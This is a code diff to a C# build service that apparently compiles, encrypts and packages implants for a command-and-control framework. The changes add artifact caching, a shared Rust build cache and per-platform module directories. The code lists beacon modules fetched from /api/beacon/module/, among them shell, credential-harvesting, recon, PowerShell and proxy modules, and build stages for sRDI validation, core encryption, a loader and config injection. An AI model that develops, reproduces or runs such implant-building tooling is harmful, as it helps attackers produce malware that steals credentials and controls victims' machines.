@@ -21,8 +21,17 @@ public partial class BuilderBuildService
     public static readonly string TemplateDir = Path.Combine(OutputBase, "loader-template");
     public static readonly string IconUploadDir = Path.Combine(Path.GetTempPath(), "libra-build-icons");
 
+    /// <summary>Prebuilt artifacts (core.bin + core.key) per platform — subsequent
+    /// builds of the same platform skip compilation entirely.</summary>
+    public static readonly string ArtifactsDir = Path.Combine(OutputBase, "artifacts");
+
+    /// <summary>Shared cargo target dir — incremental compile cache across builds.</summary>
+    public static readonly string SharedTargetDir = Path.Combine(OutputBase, "target-shared");
+
     private static readonly string RustAgentDir = Path.GetFullPath(Path.Combine(AppContext.BaseDirectory, "..", "..", "..", "..", "agent-rs"));
-    private static readonly string ModulesDir = Path.Combine(OutputBase, "modules");
+
+    /// <summary>Platform-scoped cloud module directory (one per target platform).</summary>
+    public static string ModulesDirFor(string platform) => Path.Combine(OutputBase, "modules", platform);
 
     public static readonly Dictionary<string, string> PlatformOs = new()
     {
@@ -30,6 +39,19 @@ public partial class BuilderBuildService
         ["x86"] = "windows",
         ["linux-x64"] = "linux",
     };
+
+    // Module name -> cdylib lib target name (as produced by cargo).
+    // The deployed file is named {moduleName}.{ext} and is fetched by the
+    // agent via /api/beacon/module/{moduleName}.
+    public static readonly (string Module, string Lib)[] CloudModules =
+    [
+        ("shell", "shell_module"),
+        ("recon", "recon_module"),
+        ("creds", "creds_module"),
+        ("files", "files_module"),
+        ("powershell", "powershell_module"),
+        ("proxy", "proxy_module"),
+    ];
 
     /// <summary>
     /// Resolve the actual Rust target triple for a requested platform based on
@@ -63,15 +85,18 @@ public partial class BuilderBuildService
 
     // ── Build (async) ──────────────────────────────────────────────────
 
-    public async Task RunBuildAsync(string buildId, BuildConfigRequest req, BuildJob job)
+    public async Task RunBuildAsync(string buildId, BuildConfigRequest req, BuildJob job, bool forceRebuild = false)
     {
         var ctx = new BuildContext
         {
             BuildId = buildId,
             Req = req,
             TempDir = Path.Combine(OutputBase, buildId),
+            ForceRebuild = forceRebuild,
         };
-        ctx.TargetDir = Path.Combine(ctx.TempDir, "target");
+        // All builds share one cargo target dir so incremental compilation
+        // caches carry across builds (deps are only rebuilt when source changes).
+        ctx.TargetDir = SharedTargetDir;
         ctx.FinalDir = ctx.TempDir;
 
         try
@@ -81,17 +106,6 @@ public partial class BuilderBuildService
                 if (Directory.Exists(ctx.TempDir)) Directory.Delete(ctx.TempDir, true);
                 Directory.CreateDirectory(ctx.TempDir);
             }
-
-            // Check cargo availability
-            job.Log("Checking Rust toolchain...");
-            var cargoCheck = await RunProcessAsync("cargo", "--version", job);
-            if (cargoCheck.ExitCode != 0)
-            {
-                job.Fail("Cargo/Rust is not installed. Install from https://rustup.rs");
-                UpdateHistory(job);
-                return;
-            }
-            job.Log($"Rust toolchain: {cargoCheck.Stdout.Trim()}");
 
             // Determine target triple + OS (host-aware)
             var os = PlatformOs[req.Platform]; // Build() already validated the key
@@ -115,12 +129,36 @@ public partial class BuilderBuildService
             ctx.IsMacos = os == "macos";
             ctx.ReleaseDir = Path.Combine(ctx.TargetDir, ctx.TargetTriple, "release");
             ctx.ModuleExt = ctx.IsWindows ? "dll" : ctx.IsMacos ? "dylib" : "so";
+            ctx.ModulesDir = ModulesDirFor(req.Platform);
+
+            // ── Prebuilt artifacts? Skip compilation entirely. ──
+            var artifactCore = Path.Combine(ArtifactsDir, req.Platform, "core.bin");
+            var artifactKey = Path.Combine(ArtifactsDir, req.Platform, "core.key");
+            var modulesComplete = Directory.Exists(ctx.ModulesDir)
+                && ctx.ModulesDir.Count() > 0
+                && CloudModules.All(m => System.IO.File.Exists(Path.Combine(ctx.ModulesDir, $"{m.Module}.{ctx.ModuleExt}")));
+
+            if (!forceRebuild && System.IO.File.Exists(artifactCore) && System.IO.File.Exists(artifactKey))
+            {
+                ctx.SkipCompile = true;
+                System.IO.File.Copy(artifactCore, Path.Combine(ctx.TempDir, "core.bin"), true);
+                System.IO.File.Copy(artifactKey, Path.Combine(ctx.TempDir, "core.key"), true);
+                job.Log($"Prebuilt artifacts hit for {req.Platform} — skipping core compilation");
+            }
+            else if (forceRebuild)
+            {
+                job.Log($"Force rebuild requested for {req.Platform} — compiling from source");
+            }
+            else
+            {
+                job.Log($"No cached artifacts for {req.Platform} — compiling from source");
+            }
 
             // ── Cross-compilation toolchain ──
             // Native builds need nothing extra. Cross builds require the zig
             // toolchain (cargo-zigbuild + zig on PATH); rustup must know the
             // target's std (added below, best-effort).
-            if (ctx.IsCross)
+            if (ctx.IsCross && !ctx.SkipCompile)
             {
                 job.Log($"Cross-compiling {req.Platform} ({ctx.TargetTriple}) from {(hostWindows ? "Windows" : "Linux")} host");
 
@@ -138,25 +176,36 @@ public partial class BuilderBuildService
                 }
                 job.Log($"zig {zig.Stdout.Trim()} | cargo-zigbuild ready");
             }
-            else
+            else if (!ctx.SkipCompile)
             {
                 job.Log($"Native build for {req.Platform} ({ctx.TargetTriple})");
             }
 
             // Best-effort: make sure the rust target std is installed.
-            var targetAdd = await RunProcessAsync("rustup", $"target add {ctx.TargetTriple}", job);
-            if (targetAdd.ExitCode != 0)
-                job.Log("[WARN] rustup target add failed — build may fail if the target is missing");
-
-            var buildSteps = new Func<Task>[]
+            if (!ctx.SkipCompile)
             {
-                () => Stage1_BuildCoreAsync(ctx, targetArg, job),
-                () => Stage1_5_ValidateSrdiAsync(ctx, job),
-                () => Stage1_6_BuildModuleAsync(ctx, targetArg, job),
-                () => Stage2_EncryptCoreAsync(ctx, job),
-                () => Stage3_PrepareLoaderAsync(ctx, targetArg, featuresArg, job),
-                () => Stage4_InjectConfigAsync(ctx, job),
-            };
+                var targetAdd = await RunProcessAsync("rustup", $"target add {ctx.TargetTriple}", job);
+                if (targetAdd.ExitCode != 0)
+                    job.Log("[WARN] rustup target add failed — build may fail if the target is missing");
+            }
+
+            var buildSteps = new List<Func<Task>>();
+            if (!ctx.SkipCompile)
+            {
+                buildSteps.Add(() => Stage1_BuildCoreAsync(ctx, targetArg, job));
+                buildSteps.Add(() => Stage1_5_ValidateSrdiAsync(ctx, job));
+                if (!modulesComplete)
+                    buildSteps.Add(() => Stage1_6_BuildModuleAsync(ctx, targetArg, job));
+                else
+                    job.Log($"Cloud modules already deployed for {req.Platform} — skipping module build");
+            }
+            else
+            {
+                job.Log("Cloud modules reused from platform directory");
+            }
+            buildSteps.Add(() => Stage2_EncryptCoreAsync(ctx, job));
+            buildSteps.Add(() => Stage3_PrepareLoaderAsync(ctx, targetArg, featuresArg, job));
+            buildSteps.Add(() => Stage4_InjectConfigAsync(ctx, job));
 
             foreach (var step in buildSteps)
             {
@@ -165,6 +214,23 @@ public partial class BuilderBuildService
             }
 
             UpdateHistory(job);
+
+            // Cache the compiled core artifacts for future builds of this platform.
+            if (!job.IsCompleted && !ctx.SkipCompile)
+            {
+                var artDir = Path.Combine(ArtifactsDir, req.Platform);
+                Directory.CreateDirectory(artDir);
+                try
+                {
+                    System.IO.File.Copy(Path.Combine(ctx.TempDir, "core.bin"), Path.Combine(artDir, "core.bin"), true);
+                    System.IO.File.Copy(Path.Combine(ctx.TempDir, "core.key"), Path.Combine(artDir, "core.key"), true);
+                    job.Log($"Artifacts cached for {req.Platform} — next build will skip compilation");
+                }
+                catch (Exception ex)
+                {
+                    job.Log($"[WARN] artifact caching failed: {ex.Message}");
+                }
+            }
         }
         catch (Exception ex)
         {
